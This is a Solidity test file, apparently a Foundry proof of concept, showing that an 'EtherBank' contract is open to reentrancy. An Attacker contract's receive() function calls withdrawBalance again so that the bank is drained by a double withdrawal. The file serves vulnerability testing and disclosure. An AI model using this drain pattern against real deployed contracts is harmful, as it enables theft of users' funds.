// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etherbank.sol";

contract ReentrancyAttackTest is Test {
    EtherBank public bank;
    Attacker public attacker;
    address public user = address(0x100);
    address public attackerAddr = address(0x200);

    function setUp() public {
        bank = new EtherBank();
        attacker = new Attacker(bank);
        
        // Fund user before deposit
        vm.deal(user, 1 ether);
        vm.prank(user);
        bank.addToBalance{value: 1 ether}();

        // Fund attacker wallet and deposit
        vm.deal(attackerAddr, 1 ether);
        vm.prank(attackerAddr);
        attacker.deposit{value: 1 ether}();
    }

    function testReentrancyAttack() public {
        // Pre-attack assertions
        assertEq(address(bank).balance, 2 ether, "Initial bank balance should be 2 ether");
        assertEq(bank.getBalance(address(attacker)), 1 ether, "Attacker initial balance mismatch");

        console2.log("--- BEFORE-Trigger State ---");
        uint256 bankBalancePre = address(bank).balance;
        uint256 attackerDepositPre = bank.getBalance(address(attacker));
        uint256 totalWithdrawalsPre = bank.totalWithdrawals();
        uint256 attackerContractBalancePre = address(attacker).balance;
        
        console2.log("Bank total ETH balance (before):", bankBalancePre);
        console2.log("Attacker deposit balance (before):", attackerDepositPre);
        console2.log("Total withdrawals (before):", totalWithdrawalsPre);
        console2.log("Attacker contract ETH (before):", attackerContractBalancePre);

        console2.log("--- Trigger Attack ---");
        // Execute attack
        vm.prank(attackerAddr);
        attacker.attack();

        console2.log("--- AFTER-Trigger State ---");
        uint256 bankBalancePost = address(bank).balance;
        uint256 attackerDepositPost = bank.getBalance(address(attacker));
        uint256 totalWithdrawalsPost = bank.totalWithdrawals();
        uint256 attackerContractBalancePost = address(attacker).balance;
        
        console2.log("Bank total ETH balance (after):", bankBalancePost);
        console2.log("Attacker deposit balance (after):", attackerDepositPost);
        console2.log("Total withdrawals (after):", totalWithdrawalsPost);
        console2.log("Attacker contract ETH (after):", attackerContractBalancePost);

        // Compare states
        bool bankWasDrained = bankBalancePost == 0;
        bool doubleWithdrawal = attackerContractBalancePost == attackerContractBalancePre + 2 ether;
        bool depositSetToZero = attackerDepositPost == 0;
        bool withdrawalsIncreased = totalWithdrawalsPost == totalWithdrawalsPre + 2 ether;
        
        if (bankWasDrained && doubleWithdrawal && depositSetToZero && withdrawalsIncreased) {
            console2.log("Vulnerability Exists: Reentrancy allowed double-withdrawal attack");
        } else {
            console2.log("Vulnerability not Exist: State changes don't match exploit pattern");
        }

        // Post-attack assertions
        assertEq(address(attacker).balance, 2 ether, "Attacker should have received double deposit");
        assertEq(address(bank).balance, 0, "Bank should be drained");
        assertEq(bank.getBalance(address(attacker)), 0, "Attacker bank balance should be zero");
        assertEq(bank.getBalance(user), 1 ether, "User balance should remain untouched");
    }
}

contract Attacker {
    EtherBank public bank;
    uint8 private counter;
    
    constructor(EtherBank _bank) {
        bank = _bank;
    }

    function deposit() public payable {
        bank.addToBalance{value: msg.value}();
    }

    function attack() public {
        counter = 0;
        bank.withdrawBalance();
    }

    receive() external payable {
        counter++;
        if (counter < 2) {
            bank.withdrawBalance();
        }
    }
}